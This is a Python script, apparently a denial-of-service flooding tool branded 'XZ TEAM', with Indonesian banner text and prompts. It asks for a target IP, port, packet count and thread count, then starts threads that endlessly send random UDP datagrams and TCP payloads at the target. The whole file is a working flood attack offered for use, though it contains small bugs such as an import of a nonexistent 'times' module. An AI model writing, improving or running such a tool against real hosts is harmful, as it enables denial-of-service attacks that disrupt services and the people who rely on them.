import random
import socket
import threading
import os,sys
import times


os.system("clear")
print("""
██╗░░██╗███████╗
╚██╗██╔╝╚════██║
░╚███╔╝░░░███╔═╝
░██╔██╗░██╔══╝░░    AUTOR : Xalbador
██╔╝╚██╗███████╗
╚═╝░░╚═╝╚══════╝

████████╗███████╗░█████╗░███╗░░░███╗
╚══██╔══╝██╔════╝██╔══██╗████╗░████║
░░░██║░░░█████╗░░███████║██╔████╔██║
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝""")
print("KALAU KALIAN ABUSE AMA TOOLS INI KU DELETED ASU")

ip = str(input(" Target IP:"))
port = int(input(" Target Port:"))
choice = str(input(" INI UDP DOANG (y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
	data = random._urandom(2000)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XZ TEAM NIH BOSS!!!")
		except:
			print("[X] AMPUN BANG!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XZ TEAM NIH BOSS!!!")
		except:
			s.close()
			print("[X] AMPUN BANG")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
